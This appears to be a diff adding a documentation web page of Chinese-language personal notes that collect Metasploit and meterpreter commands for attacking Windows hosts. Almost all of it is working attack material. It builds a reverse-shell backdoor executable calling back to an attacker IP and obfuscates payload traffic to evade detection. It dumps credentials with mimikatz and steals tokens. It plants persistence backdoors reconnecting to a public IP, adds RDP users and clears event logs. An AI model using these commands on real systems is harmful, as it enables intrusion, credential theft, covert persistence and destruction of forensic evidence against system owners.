@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>MSF命令 - Share Docs</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "title: metasploit\u547d\u4ee4\u6574\u7406 date: 2021-03-23 11:01:17", url: "#_top", children: [
+          ]},
+          {title: "\u5217\u51fapayload", url: "#payload", children: [
+          ]},
+          {title: "\u751f\u6210shellcode", url: "#shellcode", children: [
+          ]},
+          {title: "\u6d41\u91cf\u7684\u52a0\u5bc6\u4e0e\u6df7\u6dc6", url: "#_1", children: [
+              {title: "\u5355\u7eaf\u6df7\u6dc6", url: "#_2" },
+              {title: "TLS\u52a0\u5bc6", url: "#tls" },
+              {title: "RC4\u52a0\u5bc6", url: "#rc4" },
+          ]},
+          {title: "\u76d1\u542c", url: "#_3", children: [
+              {title: "\u6301\u7eed\u76d1\u542c", url: "#_4" },
+              {title: "\u9632\u6b62session\u8d85\u65f6\u9000\u51fa", url: "#session" },
+              {title: "\u9632\u6b62session\u5f3a\u5236\u5173\u95ed", url: "#session_1" },
+          ]},
+          {title: "meterpreter\u7684\u5404\u79cd\u547d\u4ee4", url: "#meterpreter", children: [
+              {title: "\u6587\u4ef6\u64cd\u4f5c", url: "#_5" },
+              {title: "\u6a21\u5757\u52a0\u8f7d", url: "#_6" },
+              {title: "\u547d\u4ee4\u6267\u884c\u3001\u901a\u9053\u3001\u4ee4\u724c", url: "#_7" },
+              {title: "\u8def\u7531\u53ca\u8f6c\u53d1", url: "#_8" },
+              {title: "\u6743\u9650\u7ef4\u6301\u76f8\u5173", url: "#_9" },
+              {title: "\u6e05\u9664\u65e5\u5fd7", url: "#_10" },
+          ]},
+          {title: "Msfconsole\u4e0b\u7684\u6a21\u5757", url: "#msfconsole", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-link">
+        Vcenter攻击面
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Linux%E6%8A%80%E5%B7%A7/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Linux%E6%8A%80%E5%B7%A7/" class="btn btn-xs btn-link">
+        Linux技巧
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="title-metasploit-date-2021-03-23-110117">title: metasploit命令整理 date: 2021-03-23 11:01:17</h2>
+<h2 id="payload">列出payload</h2>
+<pre><code class="language-text-plain">msfvenom --list payloads | awk '{print $1}'
+</code></pre>
+<h2 id="shellcode">生成shellcode</h2>
+<pre><code class="language-text-plain">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.17.131 lport=6666 -f exe -o backdoor.exe 
+</code></pre>
+<p>以上的方式不太方便，以下方式更方便</p>
+<pre><code class="language-text-plain">在msf命令行下use payload
+generate -f raw -o 1.bin
+</code></pre>
+<h2 id="_1">流量的加密与混淆</h2>
+<p>普通的payload流量是一定会被识别到的，可以采取几个方法进行对抗</p>
+<h3 id="_2">单纯混淆</h3>
+<pre><code class="language-text-plain">msf5 exploit(multi/handler) &gt; set enablestageencoding true
+enablestageencoding =&gt; true
+msf5 exploit(multi/handler) &gt; set stageencoder x86/shikata_ga_nai
+</code></pre>
+<h3 id="tls">TLS加密</h3>
+<pre><code class="language-text-plain">使用auxiliary/gather/impersonate_ssl伪造目标站点证书
+在handle使用 set handlersslcert *.pem 加载pem证书
+</code></pre>
+<h3 id="rc4">RC4加密</h3>
+<pre><code class="language-text-plain">使用RC4加密的payload
+payload windows/x64/meterpreter/bind_tcp_rc4
+</code></pre>
+<h2 id="_3">监听</h2>
+<p>以下文件保存为x.rb，使用-r参数加载文件。</p>
+<p>所有命令都可以写成这么个文件进行自动加载</p>
+<pre><code class="language-text-plain">use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.17.131
+set LPORT 6666
+set ExitOnSession false
+set SessionCommunicationTimeout 0
+exploit
+</code></pre>
+<p>加载文件的监听方式确实比自己手动敲命令快，但更快的是下面的命令</p>
+<pre><code class="language-text-plain">handler -H 10.211.55.2 -P 3333 -p windows/meterpreter/reverse_tcp
+</code></pre>
+<h3 id="_4">持续监听</h3>
+<p>可以在接收到seesion后继续监听端口</p>
+<pre><code class="language-text-plain">set ExitOnSession false   
+</code></pre>
+<h3 id="session">防止session超时退出</h3>
+<p>默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0</p>
+<pre><code class="language-text-plain">set SessionCommunicationTimeout 0  
+</code></pre>
+<h3 id="session_1">防止session强制关闭</h3>
+<p>默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭</p>
+<pre><code class="language-text-plain">set SessionExpirationTimeout 0 
+</code></pre>
+<h2 id="meterpreter">meterpreter的各种命令</h2>
+<h3 id="_5">文件操作</h3>
+<pre><code class="language-text-plain">cat c:\boot.ini #查看文件内容,文件必须存在
+del c:\boot.ini #删除指定的文件
+download nimeia.txt /root/Desktop/   #下载文件到本机上
+edit c:\boot.ini  # 编辑文件
+getlwd  #打印本地目录
+getwd   #打印工作目录
+lcd #更改本地目录
+ls  #列出在当前目录中的文件列表
+lpwd    #打印本地目录
+pwd #输出工作目录
+cd c:\\     #进入目录文件下
+rm file     #删除文件
+mkdir dier  #在受害者系统上的创建目录
+rmdir   #受害者系统上删除目录
+dir #列出目标主机的文件和文件夹信息
+mv  #修改目标主机上的文件名
+upload /root/backdoor.exe c:\\users\\arche\\AppData\\local\\backdoor.exe    #上传文件
+search -d d:\\www -f web.config     #search 文件，如search  -d c:\\  -f*.doc
+search -f autoexec.bat  #搜索文件
+search -f sea*.bat c:\\xamp\\
+</code></pre>
+<h3 id="_6">模块加载</h3>
+<pre><code class="language-text-plain">load mimakatz       #不用多说  help mimikatz 查看帮助
+wdigest  #获取Wdigest密码
+mimikatz_command -f samdump::hashes  #执行mimikatz原始命令
+mimikatz_command -f sekurlsa::searchPasswords
+
+load powershell     #执行powershell命令
+load espia          #截图的
+load extapi         #额外模块，一般用不到
+load lanattacks     #内网攻击模块
+</code></pre>
+<h3 id="_7">命令执行、通道、令牌</h3>
+<p>关于命令执行，可使用进入交互式shell执行命令，可以加载powershell模块执行命令，还可以使用execute后台执行，将命令放入channel。这里主要记录一下execute，在提权时可能有用。</p>
+<pre><code class="language-text-plain">execute     #执行cmd -d 在目标主机执行时显示的进程名称（用以伪装） -m 直接从内存中执行
+execute -cH -f     #c是将命令丢到通道中
+channel -r 4  #查看通道的执行结果
+
+use incognito
+execute -cH -f  #命令
+list_tokens -g  
+impersonate_token 'NT AUTHORITY\NTLM Authentication'     使用令牌
+steal_token pid 偷令牌
+
+migrate pid 注入进程\进程转移
+</code></pre>
+<h3 id="_8">路由及转发</h3>
+<pre><code class="language-text-plain">获取本地网络
+run get_local_subnets
+添加路由
+run autoroute -s 10.10.87.0/27
+端口转发，指将本机(被控机)的端口转发到远程IP(msf服务端)的端口
+portfwd add -l 3389 -r 192.168.206.200 -p 3389
+</code></pre>
+<h3 id="_9">权限维持相关</h3>
+<h4 id="persistence">persistence启动项后门</h4>
+<p>这个后门容易被杀，可以自行写入免杀的马到注册表中。当然要先上传马</p>
+<pre><code class="language-text-plain">run persistence -X -i 10 -p 6666 -r 103.45.188.176
+
+-X 系统开机自启
+-i 10 10秒重连一次
+-p 监听端口
+-r 监听机移除 persistence 后门的办法是删除 HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ 中的注册表键和 C:\WINDOWS\TEMP\ 中的 VBScript 文件。
+
+reg setval -k HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v backdoor -d c:\\users\\xxx\\AppData\\local\\backdoor.exe
+</code></pre>
+<h4 id="metsvc">metsvc服务后门</h4>
+<p>这个也不行，权限维持还是用其他方法来做比较好</p>
+<pre><code class="language-text-plain">run metsvc –A   #自动安装后门
+</code></pre>
+<h4 id="rdp">开启RDP</h4>
+<h5 id="getgui">getgui</h5>
+<pre><code class="language-text-plain">run getgui –h #查看帮助
+run getgui -e #开启远程桌面
+run getgui -u lltest2 -p 123456   #添加用户
+run getgui -f 6661 -e   #3389端口转发到6661
+run post/windows/manage/enable_rdp
+</code></pre>
+<h5 id="enable_rdp">enable_rdp脚本</h5>
+<pre><code class="language-text-plain">run post/windows/manage/enable_rdp  #开启远程桌面
+run post/windows/manage/enable_rdp USERNAME=admin PASSWORD=123456 #添加用户
+run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662
+脚本位于/usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb
+通过enable_rdp.rb脚本可知：开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令
+</code></pre>
+<h3 id="_10">清除日志</h3>
+<pre><code class="language-text-plain">clearev 清除事件日志
+</code></pre>
+<h2 id="msfconsole">Msfconsole下的模块</h2>
+<p>模块我没有记录，因为它的模块都是很有规则的，不需要一个个记它。比如扫描类的都是scanner打头，利用类的都是exploit、misc打头。实在不行还有search命令，所以记模块没用，记住大概就行了。</p>
+<p>以上。</p>
+<p>![[Pasted image 20230523150052.png]]</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-link">
+        Vcenter攻击面
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Linux%E6%8A%80%E5%B7%A7/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Linux%E6%8A%80%E5%B7%A7/" class="btn btn-xs btn-link">
+        Linux技巧
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
